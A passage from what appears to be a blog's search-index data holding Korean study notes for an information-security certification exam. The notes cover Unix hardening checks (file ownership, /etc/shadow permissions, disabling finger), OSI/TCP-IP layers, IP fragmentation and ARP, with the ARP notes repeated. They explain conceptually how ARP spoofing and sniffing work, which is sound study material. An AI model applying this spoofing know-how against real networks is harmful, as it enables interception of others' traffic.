않은 파일 및 디렉터리가 존재하지 않는 경우 양호                    삭제된 소유자의 UID 와 동일한 UID 사용자가 접근 가능           존재할 경우 삭제 또는 소유자변경 필요                            rm [file명|디렉터리명]               chown [user명] [file명]                                               OS 별 점검 파일 위치 및 점검 방법                    소유자가 nouser, nogroup 인 파일이나 디렉터리 탐색           SunOS, AIX                            #find / -nouser -o -nogroup -xdev -ls 2&gt; /dev/null                                   HP-UX                            #find / \\( -nouser -o -nogroup \\) -xdev -exec ls -al {} \\; 2&gt;dev/null                                   Linux                            #find / -nouser -print               #find / -nogroup -print                                                   /etc/passwd 파일 소유자 및 권한 확인            /etc/passwd 파일 소유자가 root 이고, 권한이 644 이하인 경우 양호       OS 별 점검 파일 위치 및 점검 방법                    SunOS, Linux, AIX, HP-UX                            #ls -l /etc/passwd               chown root /etc/passwd               chmod 644 /etc/passwd                                                   /etc/shadow 파일 소유자 및 권한 확인            /etc/shadow 파일 소유자가 root 이고, 권한이 400 인 경우 양호       OS 별 점검 파일 위치 및 점검 방법                    SunOS, Linux                            #ls -l /etc/shadow                                   AIX                            ls -ld /etc/security/passwd                                   HP-UX                            ls -ld /tcb/files/auth                                   조치                            chown root [파일위치]               chmod 400 [파일위치]                                                   /etc/hosts 파일 소유자 및 권한 확인            /etc/hosts 파일 소유자가 root 이고, 권한이 600 인 경우 양호       IP 주소와 대응되는 호스트네임이 기록되어 있는 파일, 잘못 매핑 되어있을 경우 악의적인 시스템에 연결됨       OS 별 점검 파일 위치 및 점검 방법                    SunOS, Linux, AIX, HP-UX                            #ls -l /etc/hosts                                                   world writable 파일 점검            world writable 파일이 존재하지 않거나 존재 시 설정 이유를 확인하고 있는 경우 양호       world writable : 모든 사용자가 작성할 수 있는 파일       OS 별 점검 파일 위치 및 점검 방법                    #find / -perm -2 -ls           chmod o-w [파일명]                           그 외 중요 파일들            /etc/xinetd.conf, /etc/inetd.conf : 슈퍼데몬 설정파일 (프로그램 등록)                    root 소유 600 권한 이하 설정                       /etc/syslog.conf : syslogd 설정파일, 여러 로그에 대한 정보를 남김                    root 소유 644 권한 이하 설정                       /etc/services : 서비스관리 정보 (포트, 프로토콜 정보)                    root 소유 644 권한 이하 설정                           서비스 관리      Finger 서비스 비활성화            Finger 서비스가 비활성화 되어 있는 경우 양호       Finger                    사용자 정보 확인 서비스           네트워크에 연결된 타 시스템의 사용자 확인 가능           외부에서 확인 가능           자세한 정보 제공                       who : 현재 사용중인 사용자 확인 (간단한 정보)       OS 별 점검 파일 위치 및 점검 방법                    Linux, AIX, HP-UX, SunOS (5.9 이하)                            cat /etc/inetd.conf               #finger stream tcp nowait bin /usr/lbin/fingerd fingerd (주석처리)                                   SunOS (5.9 이상)                            inetadm | grep \"finger\"               inetadm -d [데몬명]                                   Linux (xinetd)                            ls -al /etc/xinetd.d/* | egrep \"echo finger\"               vi /etc/xinetd.d/finger                                    disable=yes                                                                   적용을 위해 서비스 재시작                            kill -HUP [pid]               service xinetd restart                                                        그 외 익명 ftp, r 계열 서비스 비활성화       cron 파일 소유자 및 권한 설정            cron 접근제어 파일 소유자가 root 이고 권한이 640 이하인 경우 양호       OS 별 점검 파일 위치 및 점검 방법                    Linux, AIX, HP-UX, SunOS                            ls -al [cron 접근제어 파일 경로]               SunOS : /etc/crontab               Linux, AIX, HP-UX : /var/spool/cron/crontabs/*                                                   패치 관리      최신 보안패치 및 벤더 권고사항 적용            패치 적용 정책을 수립하고 주기적으로 패치를 관리하고 있는 경우 양호       패치 적용 정책 수립여부 및 정책에 따른 패치 적용여부 확인           로그 관리      로그의 정기적 검토 및 보고            로그 기록의 검토 분석 리포트 작성 및 보고 등이 정기적으로 이루어지는 경우 양호       로그 분석 계획 수립여부 및 로그 분석결과에 대한 점검       정기적인 로그 분석을 위한 절차                    정기적인 로그 검토 및 분석 주기 수립           로그 분석에 대한 결과 보고서 작성           로그 분석 결과보고서 보고 체계 수립                           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","UNIX"],
        "url": "https://bluesplatter.com/is_certification/IS-Unix-vulnerability/",
        "teaser": null
      },{
        "title": "정보보안 - 네트워크 OSI 계층모델",
        "excerpt":"OSI 계층 모델      개념            개방형 시스템 상호연결(Open System Interconnection) 모델 (ISO 표준)       상호 이질적인 네트워크간 연결에 호환성 확보를 위함       TCP/IP 는 OSI참조 모델을 기반으로 단순화, 현실화의 과정에서 채택된 모형       거대한 하나의 프로토콜이 아닌 계층별 분할을 통해 접근하는 방식           OSI 7계층            사용자 지원 계층 (상위 계층)                                                응용 계층                                    사용자가 네트워크에 접근할 수 있도록 해주는 계층                   사용자 인터페이스, 저자우편, 데이터베이스 관리 등의 서비스 제공                   텔넷, HTTP, SSH, SMTP, FTP                   데이터 단위 : 데이터                                                                                               표현 계층                                    운영체계의 한 부분                   입력 또는 출력되는 데이터를 하나의 표현형태로 변환                   필요한 번역을 수행하여 두 장치가 일관되게 전송 데이터를 서로 이해할 수 있도록 한다.                   제어코드나 문자 및 그래픽 등의 확장자(jpg, gif, mpg)                   인코딩/디코딩, 압축/압축해제, 암호화/복호화                   데이터 단위 : 데이터                                                                                               세션 계층                                    통신장치 간의 세션을 설정, 유지, 동기화                   Application 간의 논리적인 연결 (포트연결, 세션) 생성, 관리                   데이터 단위 : 데이터                                                                               전송 계층                                                전송 계층 (L4 계층)                                    프로세스 간 데이터 전송                                                     Process - to - Process Communication                   논리적인 주소 (IP) 필요                   프로세스 포트 번호 필요     - 전체 메시지를 발신지 대 목적지(종단 대 종단)간 제어와 에러 관리                   End - to - End Reliable Delivery     - 신뢰성 있는 통신을 보장                   패킷들의 전송이 유효한지 확인                   실패한 패킷은 재전송     - 데이터 단위 : 세그먼트     - 프로토콜                   TCP                                            연결지향                       연결제어                       흐름제어                                                    손실 방지를 위해 사용할 수 있는 용량만큼 속도 조절                           종단 간 제어                                                                       오류제어                       혼잡제어                                                    네트워크의 혼잡도를 계산, 전송량 조절                                                                       분할, 재조합                                                    원본 -&gt; 데이터 분할 -&gt; Segment -&gt; 재조합 -&gt; 원본                                                                                                           UDP                                            비연결지향                                                    장비                                                                                                           L4 스위치                                            서버 로드 밸런싱 (트래픽 부하 분산)                       Failover 기능                                                                                                                       네트워크 계층 (하위 계층)                                                네트워크 계층 (L3 계층)                                    다중 네트워크 링크에서 패킷을 발신지로부터 목적지로 전달할 책임                   각 패킷이 시작 지점에서 최종 목적지까지 성공적이고 효과적으로 전달되도록 함                                                     End - to - End Delivery                   Routing 알고리즘     - 데이터 단위 : 패킷     - 장비                   라우터 (L3 스위치) : 최적의 경로를 찾음                                            데이터링크 계층의 Broadcast, Multicast 를 전달하지 않음                       VLAN 기능                       보안기능                       QoS 관련 기능                                                    프로토콜                                                                                                           IP                                                                                               데이터링크 계층 (L2 계층)                                    MAC 주소 (물리적 주소) 가 데이터 링크 계층에 해당                   1계층을 통해 받은 비트들이 제대로 전송되었는지 확인 (프레임 전송 신뢰성)                   1계층을 통해 받은 비트들을 어떻게 보내야 할지 결정                                                     Node - to - Node Delivery     - LAN(Local Area Network), NIC 해당     - 프로토콜                   이더넷 (Ethernet)                   HDLC                   LCC     - 데이터 단위 : frame     - 장비                   스위칭 허브                   L2 스위치                                            내부적으로 MAC Address Table 을 내장                       정확히 수신해야 할 노드에 전송 (목적지 정보가 존재)                                                    스니핑을 하기 위해 아래의 방법을 사용                           Switch Jamming, ARP Spoofing, ARP Redirect, ICMP redirect, SPAN(모니터링 포트) 활용                                                                                                           스위칭 환경 : 관리목적의 패킷 복제 (악용의 여지가 있음)                                            Monitoring Port : (SPAN : Switch Port Analyzer)                                                    특정 포트를 모니터링                           스위치를 통과하는 패킷을 복제                                                                       TAP : 트래픽을 모니터링하는 장비                                                           브릿지                                            LAN 연결장비                                                    IEEE 802 위원회 (미국 전기전자 기술자 협회) 에서는 2개의 계층으로 세분화                                                                                                           LLC (Logical Link Control : 논리적 연결 제어)                                            네트워크 계층과의 연결을 담당                                                           MAC (Media Access Control : 물리적 연결 담당)     - 신뢰성 있는 전송                   데이터 전송의 안전성 보장 : Data Link Control                                            흐름 제어 : 수신 노드의 처리속도를 감안, 속도 조절                                                    노드 간 제어                           Stop and Wait                                                            송신측에서 전송 후 수신측 확인(Ack) 응답 대기 후 전송                                                                                   Sliding Window                                                            수신측의 확인응답을 받기 전에 수신 가능한 범위에서 여러 패킷을 전송                                                                                                                               오류 제어 (Error Control) : 전송 중 여러 원인으로 인한 데이터 손실, 오류 발생 시 제어 기능                                                    BEC ( Backward Error Correction : 후진 오류 수정방식)                                                            송신 측에서 오류를 검출할 수 있는 추가정보를 같이 전송                               수신측에서 점검, 오류 발생 시 송신 측에 재전송 요청(ARQ : Automatic Repeat Request)                                                                                   FEC ( Forward Error Correction : 전진 오류 수정방식)                                                            재전송을 하지 않는 방식 (ARQ 불필요)                               송신 측에서 오류 검출, 수정도 가능한 추가정보를 전송                                                                                                                               회선제어 : 한 회선에 여러 장치가 연결된 경우 전송방식을 제어                                                    전송방식                                                            단방향 : 한 방향으로 전송                               반이중 : 동시에 전송 불가                               전이중 : 양쪽으로 동시전송 가능                                                                                                                                                                                                                                               물리 계층 (L1 계층)                                    전기적 신호만 전송                   데이터 단위 : Bit                   동축케이블, 광케이블, 랜선                   장비                                                     리피터 : 증폭기, 재생중계장치                   Dummy Hub : 전체포트로 전달                                            목적지 정보 없음                       연결된 장비의 NIC의 MAC 주소로 직접 폐기                       스니핑에 취약                                                                                                                           OSI 모델 데이터 교환 방식            캡슐화 (Encapsulation) : 헤더추가                    응용계층 -&gt; 물리계층                       역캡슐화 (Decapsulation) : 헤더 제거                    물리계층 -&gt; 응용계층                                OSI7 과 TCP/IP 비교                                  OSI 7계층           TCP/IP 4계층           주요 기능                                           ⦁ Application ⦁ Presentaion ⦁ Session           Application           ⦁ 네트워크를 실제로 사용하는 응용 프로그램으로 구성 ⦁ FTP, TELNET, SMTP 등이 있음                             Transport           Transport           ⦁ 도착하고자 하는 시스템까지 데이터를 전송 ⦁ Port를 가지고 있으며, 프로세스를 연결 또는 비연결해서 통신함 ⦁ TCP,UDP                             Network           Internet           ⦁ Datagram을 정의하고 Routing하는 일을 담당 ⦁ IP, ARP, RARP, ICMP, IGMP                             ⦁ Data Link ⦁ Physical           Network Access           케이블, 송수신기, 링크 프로토콜, LAN 접속과 같은 물리적 연결 구성을 정의                                  TCP/IP 프로토콜                    애플리케이션 계층                            TCP                                    HTTP : 80                   Telnet : 23                   FTP : 20 / 21                   SSH : 22                                            sFTP : 22                                                           SMTP : 25                   IMAP : 143                   POP3 : 110                                               UDP                                    DNS (Domain - IP) : 53                   tFTP : 69                   SNMP (네트워크 관리) : 161                                                                   트랜스포트 계층 (Process to Process Communication)                            TCP               UDP               SCTP (TCP + UDP)                                   인터넷 계층 (Host to Host Communication)                            IP (비연결형 데이터그램 프로토콜)                                    IPv4                   IPv6                                               ICMP (에러, 진단)               ARP (논리 -&gt; 물리)               RARP (물리 -&gt; 논리)               IGMP (멀티캐스트)                                   네트워크 인터페이스 계층 (Node to Node Delivery)                            MAC 주소 사용                                    총 48Bit 사용                                            상위 24Bit : 제조사                       하위 24Bit : 시리얼번호                                                                                       Ethernet : LAN               TokenRing : LAN               Frame Relay : WAN               ATM : WAN                                                   ARP / RARP 프로토콜            ARP                    IP (논리주소) -&gt; MAC (물리주소) 로 변환           과정                            질의자가 IP 를 브로드캐스트 하여 MAC 주소를 질의               해당하는 IP를 가진 응답자가 자신의 MAC 주소를 유니캐스트               해당하지 않는 Host 는 해당 프레임 폐기                                   각 Host 는 ARP Cache 를 가지고 있음                            일시적으로 보관                                   ARP Cache 테이블                            각각의 MAC/IP 정보를 일시적으로 보관               IP에 대한 MAC 질의 결과를 보관               윈도우                                    arp -a 로 확인                   Type                                            dynamic : 동적 생성 (1~2분 유지)                       static : 관리자 할당 (재부팅시 삭제)                                                           arp -d [ip] 로 삭제                                            incomplete : 삭제된 직후 MAC 주소란에 표기됨                                                           arp -s [ip] [mac] 로 static 할당                                               리눅스                                    arp -a 로 확인                                            PERM : 관리자 할당 (static)                                                           arp -d [ip] 로 삭제                   arp -s [ip] [mac] 로 static 할당                                                                               RARP                    MAC (물리주소) -&gt; IP (논리주소) 로 변환           과정                            Host 는 본인의 MAC 주소만 알고 IP를 모름 (하드디스크 없음)               질의자가 MAC 주소를 브로드캐스트 하여 IP를 질의               MAC / IP 정보를 가진 RARP 서버가 IP 주소를 유니캐스트               해당하지 않는 Host 는 해당 프레임 폐기                                                   ARP Spoofing 공격 = ARP Cache poisoning            과정 (MAC 주소 변조, 트래픽 스니핑, 2계층 공격)                    2계층은 서로 다른 네트워크끼리 라우팅하지 않음                            공격 대상은 같은 네트워크 대역               라우터 바깥으로 나갈 때는 물리적 주소가 아닌 IP 주소로 사용               Router                                    라우터의 논리적인 주소를 r.ip, 물리적 주소를 r.mac 으로 가정                   Alice : a.ip, a.mac, a.cache                                            H : b.ip h.mac (공격결과)                       H : h.ip h.mac (정상결과)                                                           Bob : b.ip, b.mac, b.cache                                            H : a.ip h.mac (공격결과)                       H : h.ip h.mac (정상결과)                                                           Hacker : h.ip, h.mac, h.cache                                            A : a.ip a.mac (정상결과)                       B : b.ip b.mac (정상결과)                                                           Hacker는 가운데에서 스니핑하며 정상 중계                                                                   Hacker, Alice (Victim), Bob (Victim), Router           Hacker는 Alice 와 Bob 의 MAC 주소를 공격자의 MAC 주소로 위조한 Reply 를 만들어서 지속적으로 전송           Alice 와 Bob 의 Cache Table 에는 Hacker 의 MAC 주소가 유지됨           Alice 와 Bob 간의 통신이 Hacker 에게 넘어감 (스니핑)           Hacker 는 Alice 와 Bob 이 스니핑을 눈치채지 못하도록 IP 포워딩 (전송기능 활성화)                            Arp Cache 가 저장된 Router 주소를 자신의 주소로 변조시킴               외부로 나가는 데이터를 전부 스니핑               Arp Redirect 공격                                               ARP 의 취약점을 완전히 없애는 방법은 없음. 정적인 설정으로 캐시정보 갱신 X                    시스템이 종료되면 전부 삭제           재가동 될 때마다 ARP 캐시를 정적으로 구성           ARP Watch : ARP 트래픽을 실시간으로 모니터링                       GARP (Gratuitous - 불필요한)                    Sender IP 와 Target IP 를 동일하게 함           목적                            IP 주소 충돌 감지                                    자신 이외의 Reply 를 받아서는 안됨                   Reply 가 있을 경우 자신과 같은 IP를 가진 Host 가 존재함을 인지                                               ARP Table 갱신                                    MAC 주소 변경 시 자신의 MAC 주소가 바뀌었음을 알려줌                   ARP 문제점 : 인증을 하지 않고 수정함 (취약점 존재)                                                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-OSI7/",
        "teaser": null
      },{
        "title": "정보보안 - 네트워크 TCP/IP 계층모델",
        "excerpt":"        OSI7 과 TCP/IP 비교                                  OSI 7계층           TCP/IP 4계층           주요 기능                                           ⦁ Application ⦁ Presentaion ⦁ Session           Application           ⦁ 네트워크를 실제로 사용하는 응용 프로그램으로 구성 ⦁ FTP, TELNET, SMTP 등이 있음                             Transport           Transport           ⦁ 도착하고자 하는 시스템까지 데이터를 전송 ⦁ Port를 가지고 있으며, 프로세스를 연결 또는 비연결해서 통신함 ⦁ TCP,UDP                             Network           Internet           ⦁ Datagram을 정의하고 Routing하는 일을 담당 ⦁ IP, ARP, RARP, ICMP, IGMP                             ⦁ Data Link ⦁ Physical           Network Access           케이블, 송수신기, 링크 프로토콜, LAN 접속과 같은 물리적 연결 구성을 정의                                  TCP/IP 프로토콜                    애플리케이션 계층                            TCP                                    HTTP : 80                   Telnet : 23                   FTP : 20 / 21                   SSH : 22                                            sFTP : 22                                                           SMTP : 25                   IMAP : 143                   POP3 : 110                                               UDP                                    DNS (Domain - IP) : 53                   tFTP : 69                   SNMP (네트워크 관리) : 161                                                                   트랜스포트 계층 (Process to Process Communication)                            TCP               UDP               SCTP (TCP + UDP)                                   인터넷 계층 (Host to Host Communication)                            IP (비연결형 데이터그램 프로토콜)                                    IPv4                   IPv6                                               ICMP (에러, 진단)               ARP (논리 -&gt; 물리)               RARP (물리 -&gt; 논리)               IGMP (멀티캐스트)                                   네트워크 인터페이스 계층 (Node to Node Delivery)                            MAC 주소 사용                                    총 48Bit 사용                                            상위 24Bit : 제조사                       하위 24Bit : 시리얼번호                                                                                       Ethernet : LAN               TokenRing : LAN               Frame Relay : WAN               ATM : WAN                                                   ARP / RARP 프로토콜            ARP                    IP (논리주소) -&gt; MAC (물리주소) 로 변환           과정                            질의자가 IP 를 브로드캐스트 하여 MAC 주소를 질의               해당하는 IP를 가진 응답자가 자신의 MAC 주소를 유니캐스트               해당하지 않는 Host 는 해당 프레임 폐기                                   각 Host 는 ARP Cache 를 가지고 있음                            일시적으로 보관                                   ARP Cache 테이블                            각각의 MAC/IP 정보를 일시적으로 보관               IP에 대한 MAC 질의 결과를 보관               윈도우                                    arp -a 로 확인                   Type                                            dynamic : 동적 생성 (1~2분 유지)                       static : 관리자 할당 (재부팅시 삭제)                                                           arp -d [ip] 로 삭제                                            incomplete : 삭제된 직후 MAC 주소란에 표기됨                                                           arp -s [ip] [mac] 로 static 할당                                               리눅스                                    arp -a 로 확인                                            PERM : 관리자 할당 (static)                                                           arp -d [ip] 로 삭제                   arp -s [ip] [mac] 로 static 할당                                                                               RARP                    MAC (물리주소) -&gt; IP (논리주소) 로 변환           과정                            Host 는 본인의 MAC 주소만 알고 IP를 모름 (하드디스크 없음)               질의자가 MAC 주소를 브로드캐스트 하여 IP를 질의               MAC / IP 정보를 가진 RARP 서버가 IP 주소를 유니캐스트               해당하지 않는 Host 는 해당 프레임 폐기                                                   ARP Spoofing 공격 = ARP Cache poisoning            과정 (MAC 주소 변조, 트래픽 스니핑, 2계층 공격)                    2계층은 서로 다른 네트워크끼리 라우팅하지 않음                            공격 대상은 같은 네트워크 대역               라우터 바깥으로 나갈 때는 물리적 주소가 아닌 IP 주소로 사용               Router                                    라우터의 논리적인 주소를 r.ip, 물리적 주소를 r.mac 으로 가정                   Alice : a.ip, a.mac, a.cache                                            H : b.ip h.mac (공격결과)                       H : h.ip h.mac (정상결과)                                                           Bob : b.ip, b.mac, b.cache                                            H : a.ip h.mac (공격결과)                       H : h.ip h.mac (정상결과)                                                           Hacker : h.ip, h.mac, h.cache                                            A : a.ip a.mac (정상결과)                       B : b.ip b.mac (정상결과)                                                           Hacker는 가운데에서 스니핑하며 정상 중계                                                                   Hacker, Alice (Victim), Bob (Victim), Router           Hacker는 Alice 와 Bob 의 MAC 주소를 공격자의 MAC 주소로 위조한 Reply 를 만들어서 지속적으로 전송           Alice 와 Bob 의 Cache Table 에는 Hacker 의 MAC 주소가 유지됨           Alice 와 Bob 간의 통신이 Hacker 에게 넘어감 (스니핑)           Hacker 는 Alice 와 Bob 이 스니핑을 눈치채지 못하도록 IP 포워딩 (전송기능 활성화)                            Arp Cache 가 저장된 Router 주소를 자신의 주소로 변조시킴               외부로 나가는 데이터를 전부 스니핑               Arp Redirect 공격                                               ARP 의 취약점을 완전히 없애는 방법은 없음. 정적인 설정으로 캐시정보 갱신 X                    시스템이 종료되면 전부 삭제           재가동 될 때마다 ARP 캐시를 정적으로 구성           ARP Watch : ARP 트래픽을 실시간으로 모니터링                       GARP (Gratuitous - 불필요한)                    Sender IP 와 Target IP 를 동일하게 함           목적                            IP 주소 충돌 감지                                    자신 이외의 Reply 를 받아서는 안됨                   Reply 가 있을 경우 자신과 같은 IP를 가진 Host 가 존재함을 인지                                               ARP Table 갱신                                    MAC 주소 변경 시 자신의 MAC 주소가 바뀌었음을 알려줌                   ARP 문제점 : 인증을 하지 않고 수정함 (취약점 존재)                                                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-TCPIP/",
        "teaser": null
      },{
        "title": "정보보안 - 네트워크 ARP / RARP",
        "excerpt":"   ARP / RARP 프로토콜            ARP                    IP (논리주소) -&gt; MAC (물리주소) 로 변환           과정                            질의자가 IP 를 브로드캐스트 하여 MAC 주소를 질의               해당하는 IP를 가진 응답자가 자신의 MAC 주소를 유니캐스트               해당하지 않는 Host 는 해당 프레임 폐기                                   각 Host 는 ARP Cache 를 가지고 있음                            일시적으로 보관                                   ARP Cache 테이블                            각각의 MAC/IP 정보를 일시적으로 보관               IP에 대한 MAC 질의 결과를 보관               윈도우                                    arp -a 로 확인                   Type                                            dynamic : 동적 생성 (1~2분 유지)                       static : 관리자 할당 (재부팅시 삭제)                                                           arp -d [ip] 로 삭제                                            incomplete : 삭제된 직후 MAC 주소란에 표기됨                                                           arp -s [ip] [mac] 로 static 할당                                               리눅스                                    arp -a 로 확인                                            PERM : 관리자 할당 (static)                                                           arp -d [ip] 로 삭제                   arp -s [ip] [mac] 로 static 할당                                                                               RARP                    MAC (물리주소) -&gt; IP (논리주소) 로 변환           과정                            Host 는 본인의 MAC 주소만 알고 IP를 모름 (하드디스크 없음)               질의자가 MAC 주소를 브로드캐스트 하여 IP를 질의               MAC / IP 정보를 가진 RARP 서버가 IP 주소를 유니캐스트               해당하지 않는 Host 는 해당 프레임 폐기                                                   ARP Spoofing 공격 = ARP Cache poisoning            과정 (MAC 주소 변조, 트래픽 스니핑, 2계층 공격)                    2계층은 서로 다른 네트워크끼리 라우팅하지 않음                            공격 대상은 같은 네트워크 대역               라우터 바깥으로 나갈 때는 물리적 주소가 아닌 IP 주소로 사용               Router                                    라우터의 논리적인 주소를 r.ip, 물리적 주소를 r.mac 으로 가정                   Alice : a.ip, a.mac, a.cache                                            H : b.ip h.mac (공격결과)                       H : h.ip h.mac (정상결과)                                                           Bob : b.ip, b.mac, b.cache                                            H : a.ip h.mac (공격결과)                       H : h.ip h.mac (정상결과)                                                           Hacker : h.ip, h.mac, h.cache                                            A : a.ip a.mac (정상결과)                       B : b.ip b.mac (정상결과)                                                           Hacker는 가운데에서 스니핑하며 정상 중계                                                                   Hacker, Alice (Victim), Bob (Victim), Router           Hacker는 Alice 와 Bob 의 MAC 주소를 공격자의 MAC 주소로 위조한 Reply 를 만들어서 지속적으로 전송           Alice 와 Bob 의 Cache Table 에는 Hacker 의 MAC 주소가 유지됨           Alice 와 Bob 간의 통신이 Hacker 에게 넘어감 (스니핑)           Hacker 는 Alice 와 Bob 이 스니핑을 눈치채지 못하도록 IP 포워딩 (전송기능 활성화)                            Arp Cache 가 저장된 Router 주소를 자신의 주소로 변조시킴               외부로 나가는 데이터를 전부 스니핑               Arp Redirect 공격                                               ARP 의 취약점을 완전히 없애는 방법은 없음. 정적인 설정으로 캐시정보 갱신 X                    시스템이 종료되면 전부 삭제           재가동 될 때마다 ARP 캐시를 정적으로 구성           ARP Watch : ARP 트래픽을 실시간으로 모니터링                       GARP (Gratuitous - 불필요한)                    Sender IP 와 Target IP 를 동일하게 함           목적                            IP 주소 충돌 감지                                    자신 이외의 Reply 를 받아서는 안됨                   Reply 가 있을 경우 자신과 같은 IP를 가진 Host 가 존재함을 인지                                               ARP Table 갱신                                    MAC 주소 변경 시 자신의 MAC 주소가 바뀌었음을 알려줌                   ARP 문제점 : 인증을 하지 않고 수정함 (취약점 존재)                                                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-ARP_RARP/",
        "teaser": null
      },{
        "title": "정보보안 - 네트워크 IP 프로토콜",
        "excerpt":"        IP 프로토콜 (Internet Protocol)              헤더구조, IP 프로토콜 동작방식, IP 단편화       비연결형/비신뢰적 프로토콜 (연결상태를 유지하지 않음)       패킷 전송 순서를 보장하지 않음                    라우터간 경로가 만들어 졌을 때 중간의 라우터에 의해 경로가 바뀔 수 있음           전송 순서가 변경되거나 중간의 손실 등이 있을 수 있음                                IP Header              이미지 출처              IPv4 : 기본 헤더 20 Byte, 옵션 헤더 40 Byte       Version (4bit) : 버전정보, 4.0       IHL (4bit) : 헤더의 길이, HLEN       Type of service (8bit) : QoS(서비스 품질), 현재 사용 X       Total length (16bit) : 전체 IP 패킷 길이       Identification (16bit) : 단편화 되기 전 식별 값                    단편화 (Fragmentation) / 재조합 (Reassembly) 관련 필드                       Flag 필드 : 단편화, 재조합과 관련된 필드                    첫번째 Bit : 사용 X (예약)           두번째 Bit : DF (Don’t Fragment Bit)                            1 설정 시 단편화 X                                   세번쨰 Bit : MF (More Fragments Bit)                            1 설정 시 재조합할 조각이 더 있음               0 설정 시 더 이상 단편화된 조각이 없음                                               Fragment offset : 단편화, 재조합과 관련된 필드                    IP는 전송의 순서를 보장하지 않음           각각의 단편에 대한 상대위치값 (offset) 표기           Bit 표기 = 8 Byte 단위로 표기                       Time to live (8bit) : IP 패킷 생존시간                    네트워크에 패킷이 계속 떠돌면 안됨.           L3 스위치, 라우터 를 건너 뛸 때 (hop) 통과 가능 횟수           리눅스 : 64           윈도우 : 128           유닉스 : 255           TTL 값을 이용해 시스템 정보를 얻는 취약점이 있음 (OS Fingerprint)                       Protocol (8bit) : 상위 프로토콜과의 다중화, 역다중화를 위한 식별자                    상위 프로토콜을 식별하기 위한 번호           HTTP, telnet 등 응용계층 프로토콜 -&gt; TCP                            TCP 하나로 여러 가지 프로토콜을 사용하는 것 : 다중화                                   TCP -&gt; HTTP, telnet 등으로 분기                            역다중화                                               Header checksum : 헤더 부분의 오류 검사 (Data 부 제외)       Source address       Destination address       Options : 경로설정, 타이밍 관리 등 패킷의 부가정보                    잘 사용하지 않음 (악용, 공격에 활용 가능)           Loose Source Route : 느슨한 소스 라우팅                            출발지에서 지정하는 옵션                                   Strict Source Route : 엄격한 소스 라우팅                            출발지에서 지정한 경로로 무조건 라우팅하는 옵션                                                   단편화 (Fragmentation)            하나의 파일을 이루는 데이터가 분산되어 있는 것       최대 전달 단위 : MTU (Maximum Transmission Unit)                    프레임의 최대 크기           단편화 되는 데이터그램의 크기는 MTU 보다 작아야 함           (클 시 전송 불가능)                       Ethernet 프로토콜 일 경우 1500 Byte       X.25 : 576 Byte       FDDI : 4352 Byte       예:                    MTU 가 1500 byte 일 경우           2800 byte 전송 시 쪼개야 함                            2 개의 프레임 생성               IP Header + IP payload (쪼갠 데이터) : 1500 byte 이하여야 함                                               과정                    출발부터 단편화가 이루어짐 (예: Ethernet 1500byte MTU)           중계구간의 L3 / Router 등을 거침           중계구간의 MTU 는 값이 다를 수도 있음                            더 작은 MTU일 경우 분할이 이루어져야 함 (예: 576byte MTU : 3분할)               분할이 이루어진 후 MTU가 커질 경우 다시 합쳐지거나 하지는 않음.                                   중간 과정에 손실이 발생할 경우                            최종 목적지에서는 일정시간 대기               최종 목적지에서 재조합 실패 시 모든 단편을 폐기               ICMP 프로토콜로 에러메시지를 출발지로 보냄                                    Type 11:Time Exceeded &gt; 시간초과                                            Code 1 : Fragment reassembly time exceeded                                                                                                                       동작방식                    가정                            Original IP Datagram                                    IP Header 20Byte                                            기본 Header 20Byte, 옵션 Header 40Byte (거의 사용안함)                       ID : 32000                                                           Payload 3100Byte                                               Ethernet 환경                                    MTU 1500Byte                                                                   단편화 과정                            frag #1                                    기본 IP Header 20Byte                                                                                                                                                            IPv4                               HLEN=20                               -(QoS)                               Total Length=1500                                                                                                                                                                                                                                               ID=32000                               FLAG=001 (X_DF_MF)                               offset = 0 (0~1479)                                                                                                                                                                   Payload 1480Byte                   합계 1500Byte                                               frag #2                                    IP Header 20Byte                                                                                                                                                            IPv4                               HLEN=20                               -(QoS)                               Total Length=1500                                                                                                                                                                                                                                               ID=32000                               FLAG=001 (X_DF_MF)                               offset = 1480 (1480~2959)                                                                                                                                                                   Payload 1480Byte                   합계 1500Byte                                               frag #3                                    IP Header 20Byte                                                                                                                                                            IPv4                               HLEN=20                               -(QoS)                               Total Length=1500                                                                                                                                                                                                                                               ID=32000                               FLAG=000 (X_DF_MF)                               offset = 2960 (2960~3099)                                                                                                                                                                   Payload 140Byte                   합계 160Byte                                                                               확인방법                    tcpdump 를 이용해서 단편화 동작방식을 분석                            (frag 단편ID : 단편사이즈 (헤더제외, Payload size) @오프셋 [+|-])                                    + : More fragments bit : 1 (추가단편이 있음)                   - : More fragments bit : 0 (추가단편이 없음)                                                                   예시                            frag # 1 : (frag 32000 : 1480 @0 +)               frag # 2 : (frag 32000 : 1480 @1480 +)               frag # 3 : (frag 32000 : 140 @2960)                                                   IP 라우팅 규칙            IP 데이터그램이 네트워크 목적지를 찾는 두 가지 방법                    직접 또는 로컬 라우팅                            송신자와 같은 물리 네트워크에 있는 목적지에는 데이터그램이 직접 전달됨                                   간접 라우팅                            목적지가 송신자와 다른 물리네트워크에 있을 경우               IP는 그 데이터그램을 다른 장치에게 보내야만 함                                   IP는 송신자 IP 주소와 목적지 IP 주소를 이용하여 목적지가 로컬 네트워크에 있는지를 판단                       Router 혹은 Gateway 경우지                    Router 와 Gateway 의 겅계가 모호해짐           라우팅 테이블을 참조 : 목적지로 가기 위한 여러가지 경로가 저장되어 있는 자료구조           netstat -rn : 해당 호스트에서 라우팅 테이블이 어떻게 구성되어있는지 확인           netmask / genmask                       검색 방법                    IP 패킷의 목적지 IP와 라우팅 테이블의 netmask/genmask 를 bit&amp; 연산한다.                            &amp; 연산 : 두 bit 가 모두 1일 때만 1               같은 네트워크에 있는지 판단                                   목적지 IP(호스트) 와 일치하는 값이 있을 경우 일치하는 경로 : 255.255.255.255           테이블에 목적지 IP(호스트) 와 일치하는 경로가 없으면 일치하는 네트워크 주소를 검색           검색결과 경로가 없을 경우 Default Gateway 이용 : 0.0.0.0 의 값                       명령어                    netstat -rn 해석                            Destination                                    목적지 호스트 or 목적지 네트워크 주소                                               Gateway                                    목적지로 전송하기 위한 게이트웨이 주소                                               Genmask                                    범용 목적의 마스크 (목적지 호스트 or 목적지 네트워크 주소 or 디폴트 